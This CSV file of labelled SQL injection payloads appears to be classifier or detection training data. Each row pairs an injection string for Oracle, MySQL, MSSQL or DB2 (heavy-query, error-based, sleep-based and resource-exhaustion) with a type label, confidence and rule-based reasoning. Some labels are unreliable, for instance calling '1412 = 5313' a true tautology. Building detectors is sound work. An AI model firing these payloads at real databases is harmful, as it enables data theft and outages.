id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
18730,"1"" ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.75,5 cartesian aliases of 'all_users' produce row explosion → heavy_query ; db_engine=oracle,1
18731,"1"" ) as lkzz where 3565 = 3565 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,0.85,injected WHERE-tautology 'where 3565 = 3565' is boolean true oracle ; db_engine=generic,2
18732,"1 ) ) as yfvg where 1454 = 1454 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",boolean_blind,mysql,0.85,injected WHERE-tautology 'where 1454 = 1454' is boolean true oracle ; secondary signals: 'union select' (union_based) ; db_engine=mysql,2
18733,"1%"" ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ""%"" = """,boolean_blind,generic,0.50,"UNCERTAIN: no rule-pattern match; both sources A and C agree on 'boolean_blind'. Payload fragment: '1%"" ) ) or 9643 = ( select count ( * ) from domain.domains a'",0
18734,"1' ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( 'zypa' = 'zypa",boolean_blind,mysql,0.85,numeric tautology '1045 = 1045' acts as boolean true branch ; secondary signals: 'union select' (union_based) ; db_engine=mysql,2
18735,"1' ) where 9951 = 9951 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",boolean_blind,generic,0.85,injected WHERE-tautology 'where 9951 = 9951' is boolean true oracle ; db_engine=generic,2
18736,"1' ) ) as icik where 1440 = 1440 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,db2,0.95,injected WHERE-tautology 'where 1440 = 1440' is boolean true oracle ; db_engine=db2,3
18737,select ( case when ( 1412 = 5313 ) then 1412 else 1412* ( select 1412 from mysql.db ) end ) #,boolean_blind,generic,0.95,numeric tautology '1412 = 5313' acts as boolean true branch ; db_engine=generic,3
18738,"1"" ) where 2680 = 2680 or elt ( 5873 = 5873,sleep ( 5 ) ) #",boolean_blind,mysql,0.95,injected WHERE-tautology 'where 2680 = 2680' is boolean true oracle ; secondary signals: 'sleep (' (time_blind) ; db_engine=mysql,3
18739,"1"" where 2309 = 2309 or elt ( 5873 = 5873,sleep ( 5 ) ) #",boolean_blind,mysql,0.95,injected WHERE-tautology 'where 2309 = 2309' is boolean true oracle ; secondary signals: 'sleep (' (time_blind) ; db_engine=mysql,3
18740,select ( case when ( 8711 = 6432 ) then 1 else 8711* ( select 8711 from master..sysdatabases ) end ) --,boolean_blind,mssql,0.95,numeric tautology '8711 = 6432' acts as boolean true branch ; db_engine=mssql,3
18741,"1' ) where 6772 = 6772 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",boolean_blind,mysql,0.85,injected WHERE-tautology 'where 6772 = 6772' is boolean true oracle ; secondary signals: 'union select' (union_based) ; db_engine=mysql,2
18742,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ( 'ctbs' like 'ctbs",boolean_blind,generic,0.95,LIKE tautology ''ctbs' like 'ctbs' yields boolean true/false ; db_engine=generic,3
18743,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""lzyl"" like ""lzyl",boolean_blind,generic,0.50,UNCERTAIN: no specific SQLi signal token matched in payload 'call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||'; cannot determine type confidently.,0
